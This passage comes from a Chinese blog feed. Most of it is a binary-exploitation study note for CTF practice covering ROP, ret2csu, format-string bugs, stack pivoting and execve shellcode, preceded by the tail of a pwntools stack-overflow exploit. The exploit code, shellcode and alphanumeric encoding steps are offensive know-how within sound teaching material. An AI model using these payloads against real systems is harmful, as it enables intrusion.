class="number">0x08048490</span></span><br><span class="line">gets=<span class="number">0x08048460</span></span><br><span class="line">bss=<span class="number">0x804a080</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(gets) + p32(system) + p32(bss) + p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年5月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[学习笔记] pwn</title>
      <link href="/2021/05/27/pwn/"/>
      <url>/2021/05/27/pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-PWN工具"><a href="#0x00-PWN工具" class="headerlink" title="0x00 PWN工具"></a>0x00 PWN工具</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><ul><li><code>send(payload)</code> 发送payload</li><li><code>sendline(payload)</code> 发送payload，并进行换行（末尾<strong>\n</strong>）</li><li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li><li><code>recv(N)</code> 接受 N(数字) 字符</li><li><code>recvline()</code> 接收一行输出</li><li><code>recvlines(N)</code> 接收 N(数字) 行输出</li><li><code>recvuntil(some_string)</code> 接收到 some_string 为止</li><li><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code> 会连接到我们指定的地址及端口</li><li><code>process</code> 通过你声明的二进制文件路径在本地创建新的进程</li><li><code>p64()</code>会把64位整数转换为8字节字符串</li><li><code>u64()</code>会把8字节字符串转换为64位整数</li><li><code>interactive()</code>切换到直接交互模式</li></ul><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p><code>ROPgadget --binary rop --string &#39;/bin/sh&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># ROPgadget --binary rop --only &#x27;int&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure><h1 id="0x01-PWN基础"><a href="#0x01-PWN基础" class="headerlink" title="0x01 PWN基础"></a>0x01 PWN基础</h1><h2 id="Linux下的漏洞缓解措施"><a href="#Linux下的漏洞缓解措施" class="headerlink" title="Linux下的漏洞缓解措施"></a>Linux下的漏洞缓解措施</h2><ol><li>NX</li></ol><blockquote><p>所有可以被修改写入shellcode的内存都不可执行</p></blockquote><ol start="2"><li>Stack Canary（可以通过读取绕过）</li></ol><blockquote><p>用于保护栈溢出。在函数执行前，在返回地址前写入一个字长的随机数据，函数返回时校验该值是否被改变，被改变就会直接终止程序。</p></blockquote><p><img src="https://i.loli.net/2021/09/04/ALzbjIOS9aJfPws.png" alt="image-20210904201332894"></p><p><img src="https://i.loli.net/2021/09/04/lyvKbS4IPLMt3Fm.png" alt="image-20210904201655192"></p><ol start="3"><li>ASLR</li></ol><blockquote><p>将程序堆栈地址和动态链接库的加载地址进行随机化，降低攻击者对程序内存结构的了解。即使攻击者布置了shellcode并可以控制跳转，仍然无法执行。</p></blockquote><ol start="4"><li>PIE</li></ol><blockquote><p>随机化elf，开启之后将无法通过ROPgadget解决问题</p></blockquote><p><img src="https://i.loli.net/2021/09/04/FeUkXPbC3yoNYL7.png" alt="image-20210904204842899"></p><p><img src="https://i.loli.net/2021/09/04/VXEZHdGhNvksFCP.png" alt="image-20210904205421189"></p><p><img src="https://i.loli.net/2021/09/04/Aqi9vtp2dKlsVHQ.png" alt="image-20210904205449136"></p><p>你可以看到只有最后3位地址是确定的，有一种方案是把返回地址修改成后门函数地址，然后只修改后4位(因为不能只修改3位)，进行爆破。</p><ol start="5"><li>Full Relro</li></ol><blockquote><p>禁止.GOT和.PLT和其他相关内存读写</p></blockquote><h2 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h2><p><img src="https://i.loli.net/2021/05/27/Pcv87QVXZFdurUS.png" alt="image-20210527210645387"></p><p><code>08048460</code>是plt，<code>804A010</code>是got。执行gets函数使用plt地址，想知道gets函数真实地址，计算libc基址用got地址。</p><p>程序会先到plt寻找外部函数的地址，第一次调用时，程序会通过got表再次跳转到plt表，运行地址解析程序确定函数的确切地址，然后覆盖got表的初始值，然后进行函数调用。</p><p>第二次调用外部函数时，程序仍然首先从plt跳转到got，但是此时的got已经存有函数的内存地址，可以直接跳转函数所在地。</p><p>这么做的原因是为了效率，不用花时间去解析不用的函数。</p><h2 id="bss段"><a href="#bss段" class="headerlink" title="bss段"></a>bss段</h2><p>寻找bss段地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S ret2libc2 | grep bss</span><br></pre></td></tr></table></figure><p>检测bss段权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ret2libc2</span><br><span class="line">start</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure><h2 id="32位函数"><a href="#32位函数" class="headerlink" title="32位函数"></a>32位函数</h2><p>32位函数正常调用时，会有一个对应的返回地址。这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, p32(system_plt), <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, p32(binsh_addr)</span><br></pre></td></tr></table></figure><h2 id="system堆栈平衡"><a href="#system堆栈平衡" class="headerlink" title="system堆栈平衡"></a>system堆栈平衡</h2><p>有些64位的glibc的payload调用system函数需要堆栈对齐16位。</p><h2 id="一些其他的基础知识"><a href="#一些其他的基础知识" class="headerlink" title="一些其他的基础知识"></a>一些其他的基础知识</h2><p><img src="https://i.loli.net/2021/08/30/8qcGD5QOBz6tayM.png" alt="image-20210830160003015"></p><p>section会根据权限被合并成segment</p><p><img src="https://i.loli.net/2021/08/31/AkVXOTn5wicqNBS.png" alt="image-20210831223617461"></p><p><img src="https://i.loli.net/2021/09/01/XsTcDaRpygEShtC.png" alt="image-20210901154901930"></p><h2 id="c程序的运行过程"><a href="#c程序的运行过程" class="headerlink" title="c程序的运行过程"></a>c程序的运行过程</h2><p>c程序入口点是main()函数，但是在执行main函数之前其实还会做一些别的事的，比如加载so等等，这个过程是怎样的呢？大概是这样的：</p><ol><li>execve 开始执行</li><li>execve 内部会把bin程序加载后，就把<code>.interp</code>指定的动态加载器加载</li><li>动态加载器把需要加载的so都加载起来，特别的把 libc.so.6 加载</li><li>调用到libc.so.6里的<code>__libc_start_main</code>函数，真正开始执行程序</li><li><code>__libc_start_main</code>初始化后，调用到main()函数</li></ol><p>从这里也可以看出，为什么即使一个<code>int main()&#123;return 0;&#125;</code>这样的最简c程序，也会用到libc.so.6。就因为必然用到<code>__libc_start_main</code>，而<code>__libc_start_main</code>在libc.so.6里面呢。</p><h1 id="0x02-栈溢出"><a href="#0x02-栈溢出" class="headerlink" title="0x02 栈溢出"></a>0x02 栈溢出</h1><p>以32位栈举例：</p><p>初始状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> esp---&gt;+-----------------+低地址0x001</span><br><span class="line">        |                 |</span><br><span class="line">        |                 |</span><br><span class="line">        |                 |</span><br><span class="line">ebp---&gt;+-----------------+高地址0x011</span><br></pre></td></tr></table></figure><p>然后我们调用一个函数的过程是：</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">put</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span></span></span><br></pre></td></tr></table></figure><ol><li>首先进行参数从右到左依次压栈</li><li>然后将下一条指令的返回地址压入栈</li><li>跳转到执行函数入口</li><li>保存栈帧<code>push %ebp</code>，然后把栈帧切换成新的<code>mov %esp, %ebp</code>，然后再抬高栈顶<code>sub $esp, xx</code></li></ol><p>此时栈的情况如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    esp---&gt;+-----------------+低地址</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">new ebp--&gt;|                 |</span><br><span class="line">           |    ret_addr     |</span><br><span class="line">           |       1         |</span><br><span class="line">           |       2         |</span><br><span class="line">           |       3         |</span><br><span class="line">old ebp--&gt;+-----------------+高地址0x011</span><br></pre></td></tr></table></figure><p>然后新ebp上面的就是局部变量，下面的是参数。</p><p>然后是出栈</p><ol start="5"><li>保存返回值到%eax</li><li><code>mov %ebp,%esp</code>降低栈顶</li><li><code>pop %ebp</code>恢复栈帧</li><li>返回下一条指令地址<code>ret</code></li></ol><h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><ul><li>输入<code>gets()</code>直接读取一行，忽略<code>\x00</code></li><li><code>scanf()</code>，不检查长度</li><li>输出<code>sprintf()</code>将格式化后的内容写入缓冲区，但是不检查缓冲区长度</li><li>字符串<code>strcpy()</code>遇到<code>\x00</code>暂停，不检查长度，字符串复制</li><li>字符串<code>strcat()</code>遇到<code>\x00</code>暂停，不检查长度，字符串拼</li></ul><h2 id="stack-smash"><a href="#stack-smash" class="headerlink" title="stack smash"></a>stack smash</h2><p>程序开启了canary保护之后，如果我们覆盖了buffer对应的值，程序就会报错。我们可以利用报错信息得到我们想要的内容。因为程序如果发现canary被修改，就会调用<code>__stack_chk_fail</code>函数打印<code>argv[0]</code>指针指向的字符串。我们只要通过栈溢出覆盖<code>argv[0]</code>，就能输出任意信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h2><p><code>stack pivoting</code>可以通过劫持栈指针控制程序的内存，然后再在相应的位置进行ROP。</p><p>我们可以在以下情况使用<code>stack pivoting</code></p><ul><li>可以控制的栈溢出字节较少，难以构造较长的ROP链；</li><li>开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域；</li><li>将栈劫持到堆空间，从而在堆上写rop以及进行堆漏洞利用。</li></ul><h2 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h2><blockquote><p>可以参考ciscn_2019_es_2理解下文</p></blockquote><p><code>frame faking</code>的攻击原理是构造虚假的栈帧来控制程序的执行流</p><p>一般来说，payload如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer padding|fake ebp|leave ret addr|</span><br></pre></td></tr></table></figure><p><code>frame faking</code>的攻击方式是把返回地址覆盖成leave ret的地址，这样经过巧妙构造可以成功构成利用。</p><p>leave指令可以用<code>mov esp ebp ; pop ebp</code>替代</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 正常的函数</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">retn</span><br><span class="line"># exp之后</span><br><span class="line"># fake ebp指向存放shellcode的栈地址</span><br><span class="line">push ebp# 覆盖的是栈上的这个ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">mov esp, ebp</span><br><span class="line">pop ebp# pop的是fake ebp</span><br><span class="line">pop eip# retn leave</span><br><span class="line">mov esp, ebp# esp = fake ebp</span><br><span class="line">pop ebp# 随便给个ebp地址</span><br><span class="line">pop eip# 因为此时的esp地址已经被改变，所以可以直接返回到后门函数</span><br></pre></td></tr></table></figure><h1 id="0x03-ROP"><a href="#0x03-ROP" class="headerlink" title="0x03 ROP"></a>0x03 ROP</h1><p>对于静态生成的程序可以使用ropper或者ROPgadget直接生成ropchain</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ropper --file a --chain execve</span><br><span class="line"></span><br><span class="line">ROPgadget --binary a --ropchain</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/11/aBRQIq7FmusyexW.png" alt="image-20210911211941703"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary calc --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure><h1 id="0x04-格式化字符串漏洞"><a href="#0x04-格式化字符串漏洞" class="headerlink" title="0x04 格式化字符串漏洞"></a>0x04 格式化字符串漏洞</h1><p>常见的有格式化字符串函数有</p><ul><li>输入<ul><li>scanf</li></ul></li><li>输出</li></ul><table><thead><tr><th>函数</th><th>基本介绍</th></tr></thead><tbody><tr><td>printf</td><td>输出到 stdout</td></tr><tr><td>fprintf</td><td>输出到指定 FILE 流</td></tr><tr><td>vprintf</td><td>根据参数列表格式化输出到 stdout</td></tr><tr><td>vfprintf</td><td>根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td>sprintf</td><td>输出到字符串</td></tr><tr><td>snprintf</td><td>输出指定字节数到字符串</td></tr><tr><td>vsprintf</td><td>根据参数列表格式化输出到字符串</td></tr><tr><td>vsnprintf</td><td>根据参数列表格式化输出指定字节到字符串</td></tr><tr><td>setproctitle</td><td>设置 argv</td></tr><tr><td>syslog</td><td>输出日志</td></tr><tr><td>err, verr, warn, vwarn 等</td><td>。。。</td></tr></tbody></table><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fprintf</span><span class="params">(FILE* stream, <span class="keyword">const</span> <span class="keyword">char</span>* format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">const</span> <span class="keyword">char</span>* format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">snprintf</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">size_t</span> size, <span class="keyword">const</span> <span class="keyword">char</span>* format, ...)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">10</span>);</span><br></pre></td></tr></table></figure><p><code>%d</code>被称为格式化字符串，占用符用于指明输出的参数值如何格式化。</p><p>占位符的语法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><p>parameter可以忽略或者为<code>n$</code>，n表示此占位符传入的第几个参数：</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2$d %1$d\n&quot;</span>,<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 2,1</span></span><br><span class="line"><span class="comment">// 1,2</span></span><br></pre></td></tr></table></figure><p>flag可为0或者多个，主要包含：</p><table><thead><tr><th>flags</th><th>含义</th></tr></thead><tbody><tr><td>+</td><td>总是表示有符号数值的 + 或 - 号，默认忽略正数的符号。仅适用于数值类型。</td></tr><tr><td>空格</td><td>有符号数的输出如果没有正负号或者输出0个字符，则以1个空格作为前缀</td></tr><tr><td>-</td><td>左对齐，默认是右对齐</td></tr><tr><td>#</td><td>对于g与G，不删除尾部0以表示精度；对于f、F、e、E、g、G，总是输出小数点；对于o、x、X，在非0数值前分别输出前缀0、0x和0X，表示数制。</td></tr><tr><td>0</td><td>在宽度选项前，表示用0填充</td></tr></tbody></table><p>field width给出显示数值的最小宽度，若实际位数多于width，则按照实际输出，若小于，则补空格或0。如果域宽为*，则由对应的函数参数的值为当前域宽。</p><p><code>.precision</code>指明输出的最大长度：</p><ul><li>对于d、i、u、x、o的整型数值，指最小数字位数，不足的在左侧补0</li><li>对于a、A、e、E、f、F的浮点数值，指小数点右边显示的位数</li><li>对于g、G的浮点数值，指有效数字的最大位数</li><li>对于s的字符串类型，指输出的字节上限</li><li>如果域宽为*，则由对应的函数参数的值为当前域宽。如果仅给出了小数点，则域宽为0。</li></ul><p><code>length</code>指出浮点型参数或整型参数的长度：</p><ul><li>hh匹配char的整型参数</li><li>h匹配short的整型参数</li><li>l匹配long的整型参数。对于浮点类型匹配double大小的参数。对于字符串s类型，匹配wchar_t指针参数。对于字符c类型，匹配wint_t类型。</li><li>ll匹配long long的整型参数</li><li>L匹配long double的整型参数</li><li>z匹配size_t的整型参数</li><li>j匹配intmax_t的整型参数</li><li>t匹配ptrdiff_t的整型参数</li></ul><p>type：</p><ul><li><code>d、i</code> 有符号十进制int值</li><li><code>u</code> 十进制unsigned int值</li><li><code>f、F</code> 十进制double值</li><li><code>e、E</code> double值，输出形式为十进制的<code>[-]d.ddd e[+/-]ddd</code></li><li><code>g、G</code> double型数值，根据数值大小自动选f或者e</li><li><code>x、X</code> 十六进制unsigned int值</li><li><code>o</code> 八进制unsigned int值</li><li><code>s</code> 字符串，以<code>\x00</code>结尾</li><li><code>c</code> 一个char类型字符</li><li><code>p</code> void*指针类型</li><li><code>a、A</code> double类型十六进制，<code>[-]0xh.hhhh p±d</code>，指数部分为10进制表示形式</li><li><code>n</code> 把已经成功输出的字符个数写入对应的整形指针参数所指的变量</li><li><code>%</code> 字面值，不接受任何flags, width, precision or length。</li></ul><h2 id="格式化字符串利用方式"><a href="#格式化字符串利用方式" class="headerlink" title="格式化字符串利用方式"></a>格式化字符串利用方式</h2><ol><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。如果提供了一个不可访问的地址，程序就会崩溃。所以让程序崩溃的最简单方式，就是输入多个%s。</li><li>利用 %n$p来获取对应栈的内存</li><li>利用%n写数据。例如<code>%10$4n</code>就是将4写入偏移10处<strong>指针所指向的地址</strong>。我们可以通过修改偏移10处的地址，达到任意写。</li><li>%n是一次性写入4字节，%hn是一次性写入2字节，%hhn是一次性写入1字节</li></ol><p><strong>pwndbg的<code>fmtarg</code>可以计算格式化字符串的偏移。</strong></p><p>当程序开启FORTIFY机制后（<code>gcc -D_FORTIFY_SOURCE=2 -O1</code>），程序编译时所有的<code>printf</code>函数都被<code>_printf_chk</code>替换了。他们两个的区别是：(1.)不能使用%n$p不连续打印，比如要使用%3$p，必须先使用%2$p和%1$p。(2.)在使用%n的时候会做一些检查。</p><p>开启FORTIFY机制后，如果可输入的字符有限，就不能用%p泄露地址了，这种情况下可以使用%a。</p><p>由于64位通过寄存器传参6个，所以最后一个寄存器r9就是%5$p，所以64位程序栈中的参数就是从%6$p开始的。</p><h1 id="0x05-shellcode"><a href="#0x05-shellcode" class="headerlink" title="0x05 shellcode"></a>0x05 shellcode</h1><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p><strong>调用execve的条件</strong></p><ul><li>32位：<code>edx=0 ecx=0 [ebx]=&#39;/bin/sh&#39; eax=0xb int 0x80</code></li><li>64位：<code>rdx=0 rsi=0 [rdi]=&#39;/bin/sh&#39; rax=0x3b syscall</code></li></ul><p>64位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">  mov rbx,&#x27;/bin/sh&#x27;</span><br><span class="line">  push rbx</span><br><span class="line">  push rsp</span><br><span class="line">  pop rdi</span><br><span class="line">  xor esi,esi</span><br><span class="line">  xor edx,edx</span><br><span class="line">  push 0x3b</span><br><span class="line">  pop rax</span><br><span class="line">  syscall</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 x64.asm</span><br><span class="line">ld -m elf_x86_64 -o x64 x64.o</span><br><span class="line">objdump -d x64</span><br></pre></td></tr></table></figure><p>32位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">  push &quot;/sh&quot;</span><br><span class="line">  push &quot;/bin&quot;</span><br><span class="line">  mov ebx,esp</span><br><span class="line">  xor edx, edx</span><br><span class="line">  xor ecx, ecx</span><br><span class="line">  mov al, 0xb</span><br><span class="line">  int 0x80</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 i386.asm</span><br><span class="line">ld -m elf_i386 -o i386 i386.o</span><br><span class="line">objdump -d i386</span><br></pre></td></tr></table></figure><h2 id="对于字符有限制的shellcode"><a href="#对于字符有限制的shellcode" class="headerlink" title="对于字符有限制的shellcode"></a>对于字符有限制的shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;sc.bin&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">&quot;sc.bin&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Usage] ALPHA3.py [ encoder settings | I/O settings | flags ]</span><br><span class="line">encoder: 处理器架构和字符编码，例如x86，x64，例如ascii</span><br><span class="line">I/O: --input=<span class="string">&#x27;file&#x27;</span> 表示要编码的shellcode路径，--output=<span class="string">&#x27;file&#x27;</span> 表示接收编码的shellcode的文件路径。</span><br><span class="line">mixedcase指的是大小写混合，可以单独设置仅大写或者小写</span><br></pre></td></tr></table></figure><h2 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span 